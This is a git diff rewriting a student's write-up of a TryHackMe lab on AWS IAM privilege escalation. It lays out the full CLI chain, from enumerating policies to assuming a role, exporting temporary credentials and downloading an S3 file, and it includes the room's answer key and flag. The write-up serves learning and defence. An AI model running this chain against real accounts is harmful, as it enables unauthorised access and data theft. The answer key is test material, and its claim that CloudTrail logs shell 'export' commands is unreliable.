@@ -1,384 +1,335 @@
-# Day 23: AWS Security - S3cret Santa
+# Day 23: AWS Security — S3cret Santa
 
-## 📋 Quick Facts
-- **Date Completed:** December 23, 2025
-- **Time Spent:** 1 hour
-- **Difficulty:** ★★★☆ (Medium)
-- **Category:** Cloud Security / AWS IAM / Privilege Escalation
-- **Room URL:** https://tryhackme.com/room/cloudenum-aoc2025-y4u7i0o3p6
-
----
-
-## 🎯 Challenge Overview
-
-This challenge introduced AWS cloud security through investigating Sir Carrotbane's compromised credentials. I learned how AWS IAM (Identity and Access Management) works, how attackers enumerate cloud permissions, and how a single misconfiguration can lead to privilege escalation and data exfiltration from S3 buckets. While the room focused on offensive techniques (Red Team), understanding these attack paths is essential for defending cloud infrastructure.
-
-**Learning Objectives:**
-- Understand AWS IAM fundamentals (Users, Roles, Groups, Policies)
-- Learn AWS CLI basics for cloud enumeration
-- Recognize privilege escalation through role assumption
-- Identify common cloud security misconfigurations
-- Apply defensive thinking to cloud security
+**Date:** December 23, 2025  
+**Time Spent:** 1 hour  
+**Difficulty:** ★★★☆ *(Official rating: Medium — first AWS exposure; commands and IAM model were new, but the logic was clear and the room moved fast)*  
+**Category:** Cloud Security / AWS IAM / Privilege Escalation  
+**Room:** https://tryhackme.com/room/cloudenum-aoc2025-y4u7i0o3p6
 
 ---
 
-## 💡 What I Learned
+## Overview
 
-### AWS Cloud Fundamentals
+An elf found cloud credentials on Sir Carrotbane's desk. The task: use them to
+enumerate the AWS account, identify what the compromised user can do, find a
+privileged role that can be assumed, and access the S3 bucket holding TBFC's
+sensitive files.
 
-**What is "The Cloud"?**
+First time working with AWS in a hands-on context. The offensive path here is
+exactly what defenders need to understand — every step an attacker takes leaves
+a CloudTrail log entry.
 
-Instead of running servers in your own data center, the cloud lets you rent computing resources (servers, storage, databases) from providers like AWS, Microsoft Azure, or Google Cloud Platform.
+---
 
-**Why Companies Use Cloud:**
-- Scalability - Easily add/remove resources
-- Cost-effective - Pay only for what you use
-- Global reach - Deploy applications worldwide
-- Reliability - Providers handle infrastructure maintenance
+## What I Learned
 
-**Key Point:** 95%+ of organizations use cloud services, making cloud security skills essential.
+### AWS IAM — Four Core Components
 
-### AWS IAM - Identity and Access Management
+IAM (Identity and Access Management) is how AWS controls who can do what.
 
-**The Four Key Components:**
+**Users** — a single identity (person or application) with its own credentials.
+Sir Carrotbane is a user: `sir.carrotbane`
 
-**1. Users**
-- Represents a person or application
-- Has unique credentials (access keys)
-- Example: `sir.carrotbane`
+**Groups** — collections of users sharing the same permissions. Easier to manage
+at scale than assigning policies to individuals.
 
-**2. Groups**
-- Collection of users with similar permissions
-- Example: `Developers`, `Admins`
+**Roles** — temporary identities that can be "assumed" to gain different
+permissions. Roles issue temporary credentials (not permanent access keys).
+The `bucketmaster` role is what we pivot to.
 
-**3. Roles**
-- Temporary identity that can be "assumed"
-- Provides temporary credentials
-- Example: `bucketmaster` role for S3 access
+**Policies** — JSON documents defining what actions are allowed or denied, on
+which resources. Attached to users, groups, or roles.
 
-**4. Policies**
-- JSON documents defining what actions are allowed/denied
-- Attached to users, groups, or roles
-
-**Example Policy:**
+**Policy anatomy:**
 ```json
 {
   "Effect": "Allow",
-  "Action": "s3:GetObject",
-  "Resource": "arn:aws:s3:::my-bucket/*"
-}
-```
-
-**What this means:** User can download files from `my-bucket`.
-
-### AWS Services Encountered
-
-**AWS CLI (Command Line Interface):**
-- Tool for interacting with AWS services programmatically
-- Used for enumeration, administration, and investigation
-
-**AWS STS (Security Token Service):**
-- Creates temporary credentials for IAM roles
-- Key action: `sts:AssumeRole` (switch to another role)
-
-**AWS S3 (Simple Storage Service):**
-- Object storage (like cloud folders)
-- Companies store files, backups, documents
-- Example: `easter-secrets-123145` bucket
-
-### The Attack Path (What I Observed)
-
-**Privilege Escalation Chain:**
-
-```
-1. Compromised Credentials (sir.carrotbane)
-        ↓
-2. Enumerate IAM Permissions
-        ↓
-3. Discover sts:AssumeRole Capability
-        ↓
-4. Find bucketmaster Role (can be assumed)
-        ↓
-5. Assume Role (get temporary credentials)
-        ↓
-6. Access S3 Buckets
-        ↓
-7. Download Sensitive Files
-```
-
-**Key Discovery:** Sir Carrotbane couldn't directly access S3, but he could **assume a role** that had S3 access. This is privilege escalation.
-
-### Common Cloud Security Misconfigurations
-
-**1. Overly Permissive sts:AssumeRole**
-
-**Vulnerable:**
-```json
-{
-  "Action": "sts:AssumeRole",
-  "Resource": "*"
-}
-```
-Allows user to assume **any role** in the account.
-
-**Secure:**
-```json
-{
-  "Action": "sts:AssumeRole",
-  "Resource": "arn:aws:iam::123456789012:role/SpecificRole"
-}
-```
-Only specific roles can be assumed.
-
----
-
-**2. Wildcard Permissions**
-
-**Vulnerable:**
-```json
-{
-  "Action": "s3:*",
-  "Resource": "*"
-}
-```
-Full S3 access to all buckets.
-
-**Secure:**
-```json
-{
+  "Principal": {"AWS": "arn:aws:iam::123456789012:user/Alice"},
   "Action": ["s3:GetObject"],
-  "Resource": "arn:aws:s3:::specific-bucket/*"
+  "Resource": "arn:aws:s3:::my-private-bucket/*"
 }
 ```
-Limited actions on specific bucket only.
 
----
+- **Effect:** Allow or Deny
+- **Principal:** Who this applies to
+- **Action:** What they can do
+- **Resource:** What they can do it to
 
-**3. Exposed Credentials**
+**Policies can be inline** (attached directly to a user/role, lives and dies with it)
+or **attached** (standalone policy that can be reused across multiple identities).
 
-AWS access keys left in:
-- Desktop files (like Sir Carrotbane)
-- GitHub repositories
-- Application configuration files
-- Unencrypted logs
+### The Privilege Escalation Path
 
-**Real-World Examples:**
-- **Toyota (2023):** AWS keys in GitHub → customer data leaked
-- **Capital One (2019):** IAM misconfiguration → 100M+ records stolen
+Sir Carrotbane's credentials have a narrow set of permissions: read-only IAM
+enumeration plus one critical action — `sts:AssumeRole`. He cannot directly
+access S3, but he can assume a role that can.
 
----
-
-**4. Public S3 Buckets**
-
-S3 buckets accidentally set to public access.
-
-**Impact:**
-- Anyone can list/download files
-- Data breaches, compliance violations
-
-**Prevention:**
-- Enable S3 Block Public Access
-- Audit bucket policies regularly
-
-### Key AWS CLI Commands (What I Used)
-
-**Identity & Enumeration:**
-```bash
-aws sts get-caller-identity           # Who am I?
-aws iam list-users                    # List all users
-aws iam list-roles                    # List all roles
+```
+sir.carrotbane (limited IAM read + sts:AssumeRole)
+        ↓
+Enumerate roles → find bucketmaster
+        ↓
+Assume bucketmaster role → get temporary credentials
+        ↓
+Export temporary credentials to environment
+        ↓
+Access S3 buckets as bucketmaster
+        ↓
+Download cloud_password.txt from easter-secrets-123145
 ```
 
-**Role Assumption (Privilege Escalation):**
+This is a textbook IAM misconfiguration: a low-privilege user with unrestricted
+`sts:AssumeRole` can pivot to any role in the account whose trust policy allows it.
+
+### Full Command Sequence
+
+**Step 1 — Verify identity:**
 ```bash
-aws sts assume-role --role-arn <arn> --role-session-name <name>
+aws sts get-caller-identity
+# Account: 123456789012
+# UserId: i2hstx4zbyeeeifwg1tt
+# Arn: arn:aws:iam::123456789012:user/sir.carrotbane
 ```
 
-**S3 Operations:**
+**Step 2 — Enumerate users and policies:**
 ```bash
-aws s3api list-buckets                # List all buckets
-aws s3api list-objects --bucket <n>   # List bucket contents
-aws s3api get-object --bucket <n> --key <file> <output>  # Download
+aws iam list-users
+aws iam list-user-policies --user-name sir.carrotbane
+# Output: SirCarrotbanePolicy
+
+aws iam get-user-policy --user-name sir.carrotbane --policy-name SirCarrotbanePolicy
+# Reveals: IAM read permissions + sts:AssumeRole
 ```
 
----
+**Step 3 — Find assumable roles:**
+```bash
+aws iam list-roles
+# Finds: bucketmaster role, with sir.carrotbane listed as trusted Principal
+```
 
-## 🛠️ Tools & Techniques Used
+**Step 4 — Read the role's permissions before assuming:**
+```bash
+aws iam list-role-policies --role-name bucketmaster
+aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy
+```
 
-### Tools
-1. **AWS CLI** - Command-line interface for AWS
-2. **AWS IAM** - Identity and Access Management
-3. **AWS STS** - Security Token Service
-4. **AWS S3** - Object storage service
+**BucketMasterPolicy (full document):**
+```json
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Sid": "ListAllBuckets",
+      "Effect": "Allow",
+      "Action": ["s3:ListAllMyBuckets"],
+      "Resource": "*"
+    },
+    {
+      "Sid": "ListBuckets",
+      "Effect": "Allow",
+      "Action": ["s3:ListBucket"],
+      "Resource": [
+        "arn:aws:s3:::easter-secrets-123145",
+        "arn:aws:s3:::bunny-website-645341"
+      ]
+    },
+    {
+      "Sid": "GetObjectsFromEasterSecrets",
+      "Effect": "Allow",
+      "Action": ["s3:GetObject"],
+      "Resource": "arn:aws:s3:::easter-secrets-123145/*"
+    }
+  ]
+}
+```
 
-### Techniques
-- Cloud enumeration (listing IAM entities)
-- Permission analysis (reading JSON policies)
-- Privilege escalation (role assumption)
-- Data exfiltration (downloading from S3)
+Three S3 actions: `s3:ListAllMyBuckets`, `s3:ListBucket`, `s3:GetObject`.
+Two buckets in scope: `easter-secrets-123145` and `bunny-website-645341`.
+GetObject only works on `easter-secrets-123145`.
 
----
+**Step 5 — Assume the role:**
+```bash
+aws sts assume-role \
+  --role-arn arn:aws:iam::123456789012:role/bucketmaster \
+  --role-session-name TBFC
+```
 
-## 🤔 Challenges I Faced
+Output contains three temporary credential values.
 
-**New Topic - Easier Than Expected:** This was my first deep dive into AWS security, and while completely new, it was surprisingly easier than previous rooms.
+**Step 6 — Export temporary credentials:**
+```bash
+export AWS_ACCESS_KEY_ID=<AccessKeyId from output>
+export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from output>
+export AWS_SESSION_TOKEN=<SessionToken from output>
+```
 
-**What Made It Easier:**
+All subsequent AWS CLI calls now use the bucketmaster role. Verify:
+```bash
+aws sts get-caller-identity
+# Arn should now show: assumed-role/bucketmaster/TBFC
+```
 
-**Real-World Relevance:**
-- "I like it, I think it's pretty useful and align with real world application with IAM"
-- IAM is something I've heard HR and people talk about all the time
-- Seeing how it works in practice made concepts click
-- Clear connection to actual job requirements
+**Step 7 — List and access S3:**
+```bash
+aws s3api list-buckets
+# Returns: easter-secrets-123145, bunny-website-645341
 
-**Clear Output Fields:**
-- AWS CLI output is well-structured JSON
-- Fields are clearly labeled: `"RoleName": "bucketmaster"`
-- Easy to understand what each field means
-- Logical progression through enumeration steps
+aws s3api list-objects --bucket easter-secrets-123145
+# Returns: cloud_password.txt
 
-**What Was Challenging:**
+aws s3api get-object \
+  --bucket easter-secrets-123145 \
+  --key cloud_password.txt \
+  cloud_password.txt
 
-**New Commands and Options:**
-- "The problem is just like the same where there are new commands and options which I don't remember them yet"
-- AWS CLI syntax: `aws iam list-users` vs. `aws s3api get-object`
-- Flags and parameters: `--user-name`, `--role-arn`, `--bucket`
-- Can follow during challenge, but can't recall from memory
+cat cloud_password.txt
+```
 
-**Overall Experience:**
-- "Fun, useful, quick room" ✅
-- 1 hour completion (relatively fast) ✅
-- High practical value (real-world skills) ✅
-- Will need more practice to memorize commands ✅
+**Flag:** `THM{more_like_sir_cloudbane}`
 
----
+### Common IAM Misconfigurations
 
-## ✅ How This Helps My Career
+**Unrestricted AssumeRole:**
+```json
+// Vulnerable — can assume any role
+{"Action": "sts:AssumeRole", "Resource": "*"}
 
-AWS cloud security is **one of the highest-demand skills in cybersecurity**:
+// Secure — only specific role
+{"Action": "sts:AssumeRole", "Resource": "arn:aws:iam::123456789012:role/SpecificRole"}
+```
 
-**Why AWS Security Matters:**
-- **80% of companies** use AWS cloud infrastructure
-- **60% of SOC analyst jobs** require cloud security knowledge
-- **90% of data breaches** involve cloud misconfigurations
-- AWS is the **#1 cloud provider** worldwide
+**Wildcard permissions:**
+```json
+// Vulnerable
+{"Action": "s3:*", "Resource": "*"}
 
-**SOC Analyst Applications (Blue Team - My Focus):**
+// Secure — least privilege
+{"Action": ["s3:GetObject"], "Resource": "arn:aws:s3:::specific-bucket/*"}
+```
 
-**Cloud Security Monitoring:**
-- Monitor AWS CloudTrail logs for suspicious API calls
-- Detect unauthorized `sts:AssumeRole` attempts
-- Alert on unusual S3 bucket access patterns
-- Track IAM policy changes
+**Exposed credentials:** Access keys left in desktop files, GitHub repos,
+application configs, or unencrypted logs. The entire attack in this room started
+with a credential file on a desktop.
 
-**Incident Response:**
-- Investigate compromised AWS credentials
-- Determine scope of cloud account breach
-- Identify which resources were accessed
-- Trace data exfiltration from S3 buckets
-
-**Threat Hunting:**
-- Hunt for overly permissive IAM policies
-- Find users with dangerous `sts:AssumeRole` permissions
-- Identify public S3 buckets
-- Discover exposed AWS credentials in repositories
-
-**Vulnerability Assessment:**
-- Audit IAM policies for least privilege violations
-- Review role trust relationships
-- Check S3 bucket permissions
-- Identify wildcard permissions (`Resource: "*"`)
-
-**Career Skills Developed:**
-- Cloud security fundamentals (IAM, roles, policies)
-- AWS CLI basics (essential for cloud investigations)
-- Permission policy analysis (reading JSON)
-- Understanding privilege escalation in cloud
-- Cloud incident response methodology
-
-**Salary Impact:**
-- Entry SOC (no cloud): $60K-$75K
-- SOC with AWS knowledge: $75K-$95K
-- Cloud Security Analyst: $100K-$140K
-
-**Interview Talking Point:** "I have hands-on experience with AWS cloud security, including IAM enumeration, understanding privilege escalation through role assumption, and investigating S3 bucket access. I can use AWS CLI to enumerate users, roles, and policies, analyze permission documents to identify misconfigurations, and understand common cloud security issues like overly permissive role assumptions and wildcard permissions. While I'm still building command memorization, I have strong conceptual understanding of cloud security principles and can apply them to SOC monitoring, incident investigation, and vulnerability assessment in cloud environments."
-
----
-
-## 🔗 Security+ Connection
-
-**Domain 2.0 - Threats, Vulnerabilities & Mitigations (22%):** Cloud vulnerabilities, privilege escalation, credential compromise, data exfiltration, misconfigurations.
-
-**Domain 3.0 - Security Architecture (18%):** Cloud security architecture, IAM, identity management, access control models, least privilege principle.
-
-**Domain 4.0 - Security Operations (28%):** Cloud security monitoring, incident response, threat hunting, vulnerability assessment.
-
----
-
-## 📸 Evidence
-
-![AWS IAM Enumeration and Privilege Escalation](../07-Screenshots/Day23-1.png)
-*Enumerated IAM users, roles, and policies using AWS CLI; discovered sir.carrotbane has sts:AssumeRole capability leading to privilege escalation via bucketmaster role*
-
-![S3 Bucket Access and Data Exfiltration](../07-Screenshots/Day23-2.png)
-*After assuming bucketmaster role, successfully accessed S3 buckets and downloaded sensitive files from easter-secrets-123145 bucket*
+**Real-world examples the room cites:** Toyota, Accenture, and Verizon all suffered
+cloud data exposure due to IAM misconfigurations — customer data and sensitive
+documents exposed.
 
 ---
 
-## 📚 Key Takeaways for Future Reference
+## Challenges
 
-**AWS IAM Core Concepts:**
+First AWS exposure. The IAM mental model — users, groups, roles, policies — clicked
+quickly because the structure is logical. The harder part was the command syntax:
+`aws iam` vs `aws s3api` vs `aws sts`, the specific flags (`--user-name`,
+`--role-name`, `--policy-name`, `--bucket`, `--key`), and knowing the correct
+command for each step. Can follow the flow in a guided room, but can't recall
+commands cold yet. That's a practice problem.
 
-| Component | Purpose | Example |
-|-----------|---------|---------|
-| **User** | Single identity | sir.carrotbane |
-| **Role** | Temporary identity | bucketmaster |
-| **Group** | Collection of users | Developers, Admins |
-| **Policy** | Permission rules | JSON document |
-
-**Dangerous IAM Actions:**
-
-| Action | Risk Level | Why |
-|--------|------------|-----|
-| `sts:AssumeRole` | **High** | Privilege escalation |
-| `s3:GetObject` | **High** | Data exfiltration |
-| `iam:Get*` / `iam:List*` | Medium | Reconnaissance |
-
-**Common Cloud Misconfigurations (Red Flags):**
-
-❌ Wildcard Resource: `"Resource": "*"`  
-❌ Wildcard Action: `"Action": "s3:*"`  
-❌ Unrestricted AssumeRole on sensitive roles  
-❌ Public S3 buckets  
-❌ Exposed credentials in code/files  
-
-**Security Best Practices (Blue Team Defense):**
-
-✅ Least Privilege - Grant minimum permissions  
-✅ Specific Resources - Avoid wildcards  
-✅ Role Trust Restrictions - Limit who can assume roles  
-✅ S3 Block Public Access - Prevent exposure  
-✅ Credential Rotation - Regularly rotate keys  
-✅ CloudTrail Logging - Monitor all API calls  
-✅ MFA for Sensitive Operations - Require second factor  
-
-**Detection Strategies (SOC Monitoring):**
-
-**Monitor CloudTrail for:**
-- Unusual `sts:AssumeRole` calls (geography, IP, timing)
-- Multiple `iam:List*` calls (enumeration)
-- High-volume `s3:GetObject` (data exfiltration)
-- Failed authorization attempts (reconnaissance)
-- Policy modifications (privilege escalation prep)
-
-**Real-World Breach Examples:**
-
-| Company | Year | Issue | Impact |
-|---------|------|-------|--------|
-| Toyota | 2023 | AWS keys in GitHub | Customer data leaked |
-| Capital One | 2019 | IAM misconfiguration | 100M+ records stolen |
-| Verizon | 2020 | Public S3 bucket | 14M customer records |
-
-**Key Lesson:** One IAM misconfiguration = complete cloud compromise
+The temporary credential export step was new and non-obvious — after `sts:AssumeRole`
+returns credentials, you have to manually export all three environment variables
+before the new role takes effect. Easy to miss.
 
 ---
+
+## Security+ Alignment
+
+**Domain 2.0 - Threats, Vulnerabilities and Mitigations (22%):** Cloud
+misconfigurations, privilege escalation, credential exposure, data exfiltration.
+
+**Domain 3.0 - Security Architecture (18%):** IAM, cloud identity management,
+access control, least privilege principle.
+
+**Domain 4.0 - Security Operations (28%):** Cloud security monitoring, incident
+response, threat hunting in cloud environments.
+
+---
+
+## Evidence
+
+![IAM Enumeration](../07-Screenshots/Day23-1.png)
+*AWS CLI enumeration showing sir.carrotbane's SirCarrotbanePolicy and sts:AssumeRole
+capability — the pivot point for privilege escalation.*
+
+![S3 Data Access](../07-Screenshots/Day23-2.png)
+*bucketmaster role assumed, temporary credentials exported, cloud_password.txt
+downloaded from easter-secrets-123145 — flag retrieved.*
+
+---
+
+## Key Takeaways
+
+**IAM components:**
+
+| Component | What It Is | This Room |
+|---|---|---|
+| User | Single identity with credentials | `sir.carrotbane` |
+| Role | Temporary identity that can be assumed | `bucketmaster` |
+| Group | Collection of users sharing permissions | Not used here |
+| Policy | JSON document defining allow/deny rules | `SirCarrotbanePolicy`, `BucketMasterPolicy` |
+
+**Full attack command sequence:**
+```bash
+# 1. Identity check
+aws sts get-caller-identity
+
+# 2. Enumerate user policies
+aws iam list-user-policies --user-name sir.carrotbane
+aws iam get-user-policy --user-name sir.carrotbane --policy-name SirCarrotbanePolicy
+
+# 3. Find roles
+aws iam list-roles
+aws iam list-role-policies --role-name bucketmaster
+aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy
+
+# 4. Assume role
+aws sts assume-role --role-arn arn:aws:iam::123456789012:role/bucketmaster --role-session-name TBFC
+
+# 5. Export temporary credentials
+export AWS_ACCESS_KEY_ID=<value>
+export AWS_SECRET_ACCESS_KEY=<value>
+export AWS_SESSION_TOKEN=<value>
+
+# 6. Access S3
+aws s3api list-buckets
+aws s3api list-objects --bucket easter-secrets-123145
+aws s3api get-object --bucket easter-secrets-123145 --key cloud_password.txt cloud_password.txt
+```
+
+**Room answers:**
+
+| Question | Answer |
+|---|---|
+| Account parameter from `get-caller-identity` | `123456789012` |
+| IAM component describing permissions | `policy` |
+| Policy name for sir.carrotbane | `SirCarrotbanePolicy` |
+| Third bucketmaster S3 action (besides GetObject, ListBucket) | `ListAllMyBuckets` |
+| Contents of cloud_password.txt | `THM{more_like_sir_cloudbane}` |
+
+**Dangerous IAM actions for Blue Team to monitor:**
+
+| Action | Risk | Why |
+|---|---|---|
+| `sts:AssumeRole` on `*` | Critical | Can pivot to any role in account |
+| `s3:GetObject` on `*` | High | Can read any file in any bucket |
+| `iam:Get*` / `iam:List*` | Medium | Reconnaissance — mapping permissions |
+| `iam:PutUserPolicy` | Critical | Can grant own user new permissions |
+
+**CloudTrail events to alert on:**
+- `AssumeRole` calls from unexpected users or IPs
+- Burst of `iam:List*` calls — enumeration behavior
+- High-volume `s3:GetObject` — possible exfiltration
+- `GetUserPolicy` / `GetRolePolicy` — permission reading
+- New `export` of AWS environment variables in logs
+
+**Key terms:**
+
+| Term | Definition |
+|---|---|
+| IAM | Identity and Access Management — AWS service controlling who can do what |
+| `sts:AssumeRole` | IAM action allowing a user to temporarily take on a role's permissions |
+| Temporary credentials | Short-lived AccessKeyId + SecretAccessKey + SessionToken issued by STS |
+| S3 | Simple Storage Service — AWS object storage organized into buckets |
+| Least privilege | Security principle: grant only the minimum permissions needed |
+| Inline policy | Policy attached directly to one identity — not reusable |
+| Attached policy | Standalone reusable policy that can be applied to multiple identities |
